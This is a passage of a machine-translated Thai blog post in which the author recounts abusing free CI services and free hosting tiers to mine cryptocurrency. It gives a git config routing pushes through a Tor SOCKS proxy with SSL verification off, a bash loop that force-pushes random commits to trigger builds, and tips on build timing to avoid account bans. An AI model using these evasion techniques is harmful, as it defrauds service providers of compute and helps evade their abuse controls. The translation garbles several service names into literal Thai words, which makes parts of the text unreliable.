มิฉะนั้นบัญชีจะถูกแบนอย่างรุนแรงกว่า<p><a href=https://web.archive.org/web/20210222050951/https://www.bitrise.io/> Bitrise</a> ต้องตั้งค่าโปรเจ็กต์ เพื่ออนุมานสภาพแวดล้อม สถาปัตยกรรมเป้าหมาย กระบวนการดำเนินการ และสิ่งอื่น ๆ การติดตั้งบิลด์ใช้เวลานานมากจึงได้รับเรตติ้งที่ไม่ดีในการกำหนดค่า<a href=https://web.archive.org/web/20210310010750/https://continuousphp.com/> ต่อเนื่องphp</a>, <a href=https://web.archive.org/web/20210322133805/https://buddy.works/> เพื่อน</a> , [Codefresh] มีขั้นตอนการกำหนดค่าที่ไม่เปิดเผยด้วยตนเองจำนวนมาก<p>บริการเช่น [Azure-pipelines],<a href=https://web.archive.org/web/20210308202144/https://app.wercker.com/> Wercker</a>, <a href=https://web.archive.org/web/20210322133805/https://buddy.works/> เพื่อน</a> ใช้การแบนเงาในบัญชี การแบนเงานั้นไม่ดี เนื่องจากจะทำให้คุณเดาได้ว่ามีบางอย่างผิดปกติกับการกำหนดค่าของคุณหรือไม่ ด้วยบริการบางอย่าง คุณสามารถเดาเหตุผลของการแบนได้ (งานสร้างของคุณใช้เวลามากเกินไป หรือคุณสร้างหลายครั้งเกินไปในช่วงเวลาสั้นๆ) สำหรับบริการอื่นๆ เช่น [Azure-pipelines] ฉันคิดว่าพวกเขาใช้ลายนิ้วมือบางประเภท ไปยังที่เก็บข้อมูลผู้ใช้เนื่องจากการแบนกำลังเกิดขึ้นแม้จะไม่มีการใช้ทรัพยากรในทางที่ผิด Azure และ vercel ก็ถูกจำกัด<code>DNS</code> การเข้าถึงภายในเครื่องสร้างสาธารณะ ดังนั้นจึงเป็นการเสียดสีเพิ่มเติมที่ต้องเอาชนะด้วยอุโมงค์เฉพาะกิจ<p><a href=https://web.archive.org/web/20210327045555/https://cloud.drone.io/welcome> โดรน</a> ให้สิทธิ์เข้าถึงโปรเซสเซอร์ 16+ คอร์ทั้งหมด แต่จบลงด้วยการแบนหลังจาก 2 builds<sup id=fnref:saddrone><a class=fnref href=#fndef:saddrone>[13]</a></sup>. <a href=https://web.archive.org/web/20210322100629/https://www.cloudbees.com/products/codeship> การเข้ารหัส</a> ยังให้การเข้าถึงโฮสต์การสร้างที่ทรงพลังและไม่ได้แบนอย่างดุเดือดเหมือนโดรน<p>บริการที่ฉันชอบ ไม่ใช่เพราะความสามารถในการทำกำไร แต่เพื่อความสะดวก (รวมถึงโครงการอื่นๆ ด้วย) คือ<a href=https://web.archive.org/web/20210324163536/https://travis-ci.org/> ทราวิส</a>, <a href=https://web.archive.org/web/20210308041527/https://semaphoreci.com/> สัญญาณ</a> และ<a href=https://web.archive.org/web/20210322105637/https://hub.docker.com/> นักเทียบท่าฮับ</a> . Travis เป็นเหมือน CI มาตรฐานและมีความยืดหยุ่นสูง Semaphore เป็นเพียงตัวเดียว<code>DSL</code> สำหรับ<code>CI</code> ที่ดูเข้าถึงได้ง่ายและดูดี แม้ว่าจะไม่ใช่เพียงแค่ลำดับกล่องกาเครื่องหมาย Spaghettified ที่ไม่มีที่สิ้นสุดเหมือน UI อื่นๆ และ Docker เพื่อความง่ายในการแมป dockerfiles กับบิลด์<h3 id=builds_configs><a class=header-anchor href=#builds_configs> สร้างการกำหนดค่า</a></h3><p>บิลด์ถูกทริกเกอร์โดยงาน cron ที่เสนอโดยบริการเว็บหรือโดยคอมไพล์คอมมิท ดังนั้นคุณต้องติดตามการทิ้งโทเค็นการเข้าถึงหรือคีย์ ssh เพื่อจัดการคอมไพล์คอมมิททั้งหมด สิ่งสำคัญคือต้องไม่ส่งสแปมมากเกินไป และใช้พรอกซีเมื่อกดไปยังที่เก็บที่กำหนดค่าคอมไพล์:<pre><code class="toml hljs"><span class=hljs-section>[http]</span><span class=hljs-attr>proxy</span> = socks5://<span class=hljs-number>127.0</span>.<span class=hljs-number>0.1</span>:<span class=hljs-number>9050</span><span class=hljs-attr>sslverify</span> = <span class=hljs-literal>false</span><span class=hljs-section>[https]</span><span class=hljs-attr>proxy</span> = socks5://<span class=hljs-number>127.0</span>.<span class=hljs-number>0.1</span>:<span class=hljs-number>9050</span><span class=hljs-attr>sslverify</span> = <span class=hljs-literal>false</span><span class=hljs-section>[url "https://"]</span><span class=hljs-attr>insteadOf</span> = git://</code></pre><p>การใช้บริการโฮสติ้ง git ทำให้ github เป็นบริการที่ละเอียดยิ่งขึ้นเกี่ยวกับการแบน แต่พวกเขาถูกดำเนินการตามรายงานการละเมิดโดยผู้ดูแลระบบบริการ ci เท่านั้น gitlab ดำเนินการแบนคลื่นหนึ่งครั้งเมื่อฉันพยายามต่ออายุการทดลองใช้ CI (อย่างไม่ระมัดระวัง) ฉันไม่เคยถูกแบนสำหรับบัญชี bitbucket เพื่อ (บังคับ) ให้กด git คอมมิท เรามีลูปที่รันอยู่นานซึ่งติดแท็กที่เก็บ git ใหม่:<pre><code class="bash hljs"><span class=hljs-keyword>while</span> :; <span class=hljs-keyword>do</span>
    repos_count=$(ls -ld <span class=hljs-variable>${repos}</span>/* | grep -c ^d)
    repos_ival=$(((RANDOM%variance+delay)/repos_count))
    <span class=hljs-keyword>for</span> r <span class=hljs-keyword>in</span><span class=hljs-variable>$repos</span>/*; <span class=hljs-keyword>do</span><span class=hljs-built_in>cd</span><span class=hljs-string>"<span class=hljs-variable>$r</span>"</span>
        git fetch --all
        tagger
        <span class=hljs-built_in>echo</span> -e <span class=hljs-string>"\e[32m"</span><span class=hljs-string>"sleeping for <span class=hljs-variable>$repos_ival</span> since <span class=hljs-subst>$(date +%H:%M:%S\ %b/%d)</span>"</span><span class=hljs-string>"\e[0m"</span>
        sleep <span class=hljs-variable>$repos_ival</span><span class=hljs-keyword>done</span>
    sleep 1
<span class=hljs-keyword>done</span></code></pre><p>อาจเป็นไปได้ว่าการบังคับกดด้วยวิธีนี้ไม่ใช่สิ่งที่ github ชอบมาก และอาจเป็นสาเหตุให้บัญชีถูกตั้งค่าสถานะ ฟังก์ชัน tagger ที่มอบหมายให้บังคับการคอมมิตอื่น ใช้เว็บไซต์ (ซึ่งคุณสามารถค้นหาได้ค่อนข้างง่าย) ที่ให้คอมมิตแบบสุ่มบางส่วน ฉันไม่แน่ใจว่าสิ่งนี้จะช่วยได้มากเพียงใด เนื่องจากเนื้อหาของการกระทำนั้นน่าสงสัยสำหรับกรณีของฉันอย่างเห็นได้ชัด และมันยังกัดฉันในทันที เนื่องจากคอมมิตที่ส่งคืนโดยคำสั่งนี้สามารถรวมคำสบถได้ หนึ่งในการคอมมิตของฉันจึงถูกหยิบขึ้นมาโดยบอท Twitter ที่ติดตาม git กระทำด้วยคำสบถ! ฉันเพิ่มบัญชีดำสำหรับคำไม่สุภาพหลังจากเหตุการณ์<p>ฉันไม่ได้เจาะลึกคอมมิต git ที่สับสนและที่เก็บ git ที่สับสน อินสแตนซ์เดียวที่ฉันใช้พื้นที่เก็บข้อมูลที่ซับซ้อนกว่านี้คือกับ Bitrise เนื่องจากคุณไม่สามารถตั้งค่าบิลด์ได้หากระบบไม่รู้จักสภาพแวดล้อม (เช่นแอพมือถือ) แต่ถึงกระนั้นก็ไม่มีการหมุนเวียนและมันก็เหมือนเดิมเสมอ พื้นที่เก็บข้อมูลค่อนข้างง่ายที่จะมองเห็น<p>โดยรวมแล้ว ถ้าฉันต้องพลอตเส้นโค้งกระดิ่งในช่วงเวลาที่เหมาะสมที่สุดที่จะทำเหมือง<em> ปราศจาก</em>การถูกแบนบัญชีในบริการที่ทดสอบทั้งหมดจะมีระยะเวลาการสร้างศูนย์ประมาณ 1 ชั่วโมงวันละครั้ง สำหรับ cpu cores นอกเหนือจากผู้หลอกลวงสองสามราย (เช่นเสียงหึ่งๆ) บริการส่วนใหญ่คาดหวังให้คุณใช้ทรัพยากรทั้งหมดที่มอบให้คุณเนื่องจากบิลด์ทำงานภายใน VM หรือคอนเทนเนอร์ที่มีทรัพยากรที่มีข้อ จำกัด ... และการรวบรวมมักจะเป็นงานที่ อิ่มตัวซีพียู ดังนั้นจึงไม่มีความเกี่ยวข้องทางสถิติ หนึ่งบิลด์ต่อวันเป็นสิ่งที่นักพัฒนาโดยเฉลี่ยจะทำโดยสัญชาตญาณ ดังนั้นคุณควรคาดหวังให้มีการยกธงขึ้นหากคุณออกห่างจากค่าเฉลี่ย และการผลักดันให้เกิดการละเมิดไม่เคยจบลงด้วยดี<h2 id=conclusions><a class=header-anchor href=#conclusions> บทสรุป</a></h2><p>มันคุ้มค่าหรือไม่? ส่วนเครือข่ายนั้นน่าสนใจอย่างแน่นอน การจัดการกับการลงทะเบียนบัญชีเป็นส่วนที่แย่ที่สุด เห็นได้ชัดว่าไม่มีใครชอบที่จะคลิกอีเมลยืนยันที่ไม่รู้จบ และทำซ้ำขั้นตอน UI ที่ทำให้มึนงง การเขียนซอฟต์แวร์สแปมอัตโนมัติก็น่าเบื่อเช่นกัน (เพราะส่วนใหญ่คุณใช้ API ที่โง่เขลาเป็นส่วนใหญ่) และด้วยสมมติฐานนี้ (และความจริงที่ว่านี่ไม่เคยมีอะไรร้ายแรง) ฉันไม่เคยคิดเลย มันเป็นผลกำไร? ถึงจุดพีคก็ไปถึงบางอย่างเช่น<code>300$</code> ต่อเดือนอาจจะเพียงพอสำหรับชาวเวเนซุเอลาไม่ใช่สำหรับฉันจริงๆ :)<p><table class=fndef id=fndef:adversary><tbody><tr><td class=fndef-backref><a href=#fnref:adversary>[1]</a><td class=fndef-content><em> ผู้ดูแลระบบไม่พอใจ</em></table><table class=fndef id=fndef:infoproc><tbody><tr><td class=fndef-backref><a href=#fnref:infoproc>[2]</a><td class=fndef-content>แม้ว่าสิ่งนี้จะทำลายข้อสันนิษฐานด้านความเป็นส่วนตัวหลายอย่าง แต่ฉันมั่นใจว่าส่วนใหญ่จะมองเข้าไปข้างในเมื่อใดก็ตามที่มีปัญหา แต่นี่เป็นเพียงปัญหาสำหรับรันไทม์ตามคอนเทนเนอร์ในขณะที่ VM นั้นเป็นกล่องดำที่ค่อนข้างมาก</table><table class=fndef id=fndef:monerominer><tbody><tr><td class=fndef-backref><a href=#fnref:monerominer>[3]</a><td class=fndef-content>นักขุดที่สร้างในโหนด monero ได้ทำงานบางอย่างเพื่อทำให้พื้นหลังเป็นมิตรมากขึ้น แต่การกระจายของ xmrig ไม่เคยเน้นที่ความเป็นมิตรของพื้นหลัง</table><table class=fndef id=fndef:difficulty><tbody><tr><td class=fndef-backref><a href=#fnref:difficulty>[5]</a><td class=fndef-content>พูลบางแห่งมีปัญหาที่แตกต่างกันในพอร์ตการเชื่อมต่อที่แตกต่างกัน และมีแนวโน้มที่จะปรับความยากของงานให้สอดคล้องกับการแชร์ของผู้ขุด แต่ความละเอียดของพร็อกซียังสะดวกกว่า เนื่องจากจะป้องกันไม่ให้พูล<a href=https://en.wikipedia.org/wiki/Vendor_lock-in> ล็อคอิน</a> (แม้ว่าเราจะไม่เคยเปลี่ยนสระจริงๆ ก็ตาม)</table><table class=fndef id=fndef:configwatch><tbody><tr><td class=fndef-backref><a href=#fnref:configwatch>[4]</a><td class=fndef-content>มันไม่มีความสุขเมื่อจู่ๆ config ปรากฏขึ้นและหายไปจากระบบไฟล์</table><table class=fndef id=fndef:stratumprotocol><tbody><tr><td class=fndef-backref><a href=#fnref:stratumprotocol>[6]</a><td class=fndef-content>เราไม่ได้พูดถึง<a href=https://en.bitcoin.it/wiki/Stratum_mining_protocol> โปรโตคอลชั้น</a> เนื่องจากเราเพียงแค่ต้องจัดการกับสิ่งที่นำมาใช้ใน<em> ทั้งสอง</em> สระและคนงานเหมือง...ซึ่งมักจะเป็นขั้นต่ำเปล่า และอาจด้วยส่วนขยายที่ไม่ได้มาตรฐาน</table><table class=fndef id=fndef:fullbash><tbody><tr><td class=fndef-backref><a href=#fnref:fullbash>[7]</a><td class=fndef-content>ไม่เคยไปทุบตีเต็มที่ :)</table><table class=fndef id=fndef:memoryondemand><tbody><tr><td class=fndef-backref><a href=#fnref:memoryondemand>[8]</a><td class=fndef-content>ฉันไม่ได้สำรวจว่าจะเกิดอะไรขึ้นเมื่อกระบวนการโหลดฟังก์ชันเพิ่มเติมขณะรันไทม์ เนื่องจากเคอร์เนลจะค้นหาที่อยู่ในเลย์เอาต์หน่วยความจำของไฟล์เรียกทำงาน ซึ่งจะเข้าถึงระบบไฟล์และอาจทำให้เกิดความผิดพลาดได้</table><table class=fndef id=fndef:freehostinglimits><tbody><tr><td class=fndef-backref><a href=#fnref:freehostinglimits>[9]</a><td class=fndef-content>ขีดจำกัดเป็นไปตามอำเภอใจ เวลาซีพียูน้อยกว่าหนึ่งวินาที หน่วยความจำน้อยกว่า 128M การเชื่อมต่อขาออกถูกบล็อก</table><table class=fndef id=fndef:cpanelssh><tbody><tr><td class=fndef-backref><a href=#fnref:cpanelssh>[10]</a><td class=fndef-content>ด้วยความอดทนเพียงเล็กน้อย คุณยังสามารถเรียกใช้อินสแตนซ์ ssh แบบเต็มบนสภาพแวดล้อมที่บูตรอบพื้นที่บัญชี cpanel ของคุณ<em> ปราศจาก</em> มีการเข้าถึง cpanel ในตัว SSH ซึ่งมีแนวโน้มที่จะปิดการใช้งานโดยผู้ให้บริการโฮสต์</table><table class=fndef id=fndef:openshift><tbody><tr><td class=fndef-backref><a href=#fnref:openshift>[11]</a><td class=fndef-content>openshift เปลี่ยนจากระดับฟรี 1 ปีเป็น 3 เดือนเป็น 1 เดือน โดยเริ่มต้องมีการตรวจสอบสิทธิ์ทางโทรศัพท์ ฉันสามารถรับประกันได้ว่าฉันไม่ใช่คนเดียวที่ใช้บริการของพวกเขาในทางที่ผิด</table><table class=fndef id=fndef:herokucontainers><tbody><tr><td class=fndef-backref><a href=#fnref:herokucontainers>[12]</a><td class=fndef-content>คอนเทนเนอร์ระดับฟรีของ Heroku มีทรัพยากรค่อนข้างมาก มี 4c/8t (เสมือน) ซีพียู แรมจำนวนมากและพื้นที่เก็บข้อมูลขนาดใหญ่</table><table class=fndef id=fndef:saddrone><tbody><tr><td class=fndef-backref><a href=#fnref:saddrone>[13]</a><td class=fndef-content>พวกเขาเพิ่มกฎการลงทะเบียนที่เข้มงวดมากขึ้น หลังจากการแบนสองสามครั้ง ฉันอาจมีส่วนร่วมในเรื่องนี้</table><p><div id=post-tags-list>โพสต์แท็ก: <span class=post-tag><a href=https://www.unto.re/tag/crypto> การเข้ารหัสลับ</a>, </span><span class=post-tag><a href=https://www.unto.re/tag/net> สุทธิ</a>, </span><span class=post-tag><a href=https://www.unto.re/tag/shell> เปลือก</a></span></div><div class=page-foot><div class=copyright>21 สิงหาคม 2564</div></div></div><div class=page__footer><footer><div class=page__footer-copyright>© notreh - ขับเคลื่อนโดย<a href=https://github.com/tlienart/Franklin.jl> แฟรงคลิน</a></div><div class=page__footer-links>- <ul><li><a href=/th/sitemapxml> แผนผังเว็บไซต์</a></li> | <li><a href=/th/tag> แท็ก</a></li> | <li><a href=https://www.unto.re/tag/feed.xml> RSS</a></ul></div><ul class=author__wrap><li class="author__urls social-icons"><a rel="nofollow noopener noreferrer"title="Twitter link"href=https://twitter.com/untoreh><i class="fab fa-fw fa-twitter-square"aria-hidden=true></i></a><li class="author__urls social-icons"><a rel="nofollow noopener noreferrer"title="GitHub link"href=https://github.com/untoreh><i class="fab fa-fw fa-github"aria-hidden=true></i></a><li class="author__urls social-icons"><a href=mailto:contact@unto.re title=email><i class="fas fa-envelope"></i></a><li></ul></footer></div>